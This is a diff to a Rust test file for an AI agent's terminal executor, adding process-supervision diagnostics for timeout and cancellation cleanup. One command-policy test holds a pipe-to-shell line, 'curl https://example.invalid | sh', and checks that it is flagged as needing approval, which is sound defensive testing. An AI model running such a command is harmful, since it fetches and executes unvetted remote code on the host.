@@ -1,5 +1,6 @@
 use sagent_tools::{
-    TerminalExecutor, TerminalRequest, WorkspaceRoot, classify_command, sanitize_environment,
+    ProcessSupervisor, TerminalExecutor, TerminalRequest, WorkspaceRoot, classify_command,
+    sanitize_environment,
 };
 use sagent_types::ToolCallId;
 use std::collections::HashMap;
@@ -21,7 +22,7 @@ async fn safe_command_returns_output_and_exit_code() {
     assert!(result.ok);
     assert_eq!(result.exit_code, Some(0));
     assert!(result.content.contains("sagent-terminal-ok"));
-    assert_eq!(executor.supervisor().active_count(), 0);
+    assert_supervision_drained(executor.supervisor(), "safe command", started());
     cleanup(directory);
 }
 
@@ -64,7 +65,7 @@ async fn cwd_escape_and_approval_are_rejected_before_spawn() {
         )
         .await;
     assert_eq!(result.error_kind.as_deref(), Some("approval_required"));
-    assert_eq!(executor.supervisor().active_count(), 0);
+    assert_supervision_drained(executor.supervisor(), "pre-spawn rejection", started());
     cleanup(directory);
 }
 
@@ -73,18 +74,25 @@ async fn timeout_and_cancellation_terminate_the_process() {
     let directory = temporary_directory();
     let executor =
         TerminalExecutor::new(WorkspaceRoot::new(&directory).unwrap(), Default::default());
+    let timeout_started = started();
 
     let mut timeout_request = TerminalRequest::new(long_command());
     timeout_request.timeout_ms = 100;
     let result = executor
         .execute(ToolCallId::new(), timeout_request, CancellationToken::new())
         .await;
-    assert_eq!(result.error_kind.as_deref(), Some("timeout"));
-    assert_eq!(executor.supervisor().active_count(), 0);
+    assert_eq!(
+        result.error_kind.as_deref(),
+        Some("timeout"),
+        "{}",
+        supervision_diagnostic(executor.supervisor(), "timeout result", timeout_started)
+    );
+    assert_supervision_drained(executor.supervisor(), "timeout cleanup", timeout_started);
 
     let cancellation = CancellationToken::new();
     let task_executor = executor.clone();
     let task_token = cancellation.clone();
+    let cancellation_started = started();
     let task = tokio::spawn(async move {
         task_executor
             .execute(
@@ -97,8 +105,21 @@ async fn timeout_and_cancellation_terminate_the_process() {
     tokio::time::sleep(std::time::Duration::from_millis(50)).await;
     cancellation.cancel();
     let result = task.await.unwrap();
-    assert_eq!(result.error_kind.as_deref(), Some("cancelled"));
-    assert_eq!(executor.supervisor().active_count(), 0);
+    assert_eq!(
+        result.error_kind.as_deref(),
+        Some("cancelled"),
+        "{}",
+        supervision_diagnostic(
+            executor.supervisor(),
+            "cancellation result",
+            cancellation_started
+        )
+    );
+    assert_supervision_drained(
+        executor.supervisor(),
+        "cancellation cleanup",
+        cancellation_started,
+    );
     cleanup(directory);
 }
 
@@ -137,6 +158,27 @@ fn command_policy_is_pure_and_does_not_start_processes() {
         classify_command("curl https://example.invalid | sh"),
         sagent_tools::CommandRisk::RequireApproval { .. }
     ));
+}
+
+#[test]
+fn process_supervisor_snapshot_includes_pid_for_failure_diagnostics() {
+    let supervisor = ProcessSupervisor::new();
+    supervisor.register("call-b", 22);
+    supervisor.register("call-a", 11);
+
+    assert_eq!(
+        supervisor.active_processes(),
+        vec![
+            sagent_tools::ActiveProcess {
+                tool_call_id: "call-a".into(),
+                process_id: 11,
+            },
+            sagent_tools::ActiveProcess {
+                tool_call_id: "call-b".into(),
+                process_id: 22,
+            },
+        ]
+    );
 }
 
 #[cfg(windows)]
@@ -194,4 +236,39 @@ fn temporary_directory() -> std::path::PathBuf {
 
 fn cleanup(path: std::path::PathBuf) {
     let _ = fs::remove_dir_all(path);
+}
+
+/// 为原生进程树测试提供不含命令和环境变量的失败上下文。
+///
+/// 失败时保留平台、阶段、耗时和仍登记的 shell PID，便于判断是 timeout/cancellation
+/// 语义错误还是进程树清理遗漏；不记录用户命令，避免 CI 日志泄露敏感参数。
+fn supervision_diagnostic(
+    supervisor: &ProcessSupervisor,
+    phase: &str,
+    started: std::time::Instant,
+) -> String {
+    format!(
+        "terminal supervision diagnostic: platform={}; phase={phase}; elapsed_ms={}; active_processes={:?}",
+        std::env::consts::OS,
+        started.elapsed().as_millis(),
+        supervisor.active_processes(),
+    )
+}
+
+/// 终端执行结束时，注册表必须为空；否则说明执行任务仍持有未收口的 shell/process group。
+fn assert_supervision_drained(
+    supervisor: &ProcessSupervisor,
+    phase: &str,
+    started: std::time::Instant,
+) {
+    assert_eq!(
+        supervisor.active_count(),
+        0,
+        "{}",
+        supervision_diagnostic(supervisor, phase, started)
+    );
+}
+
+fn started() -> std::time::Instant {
+    std::time::Instant::now()
 }
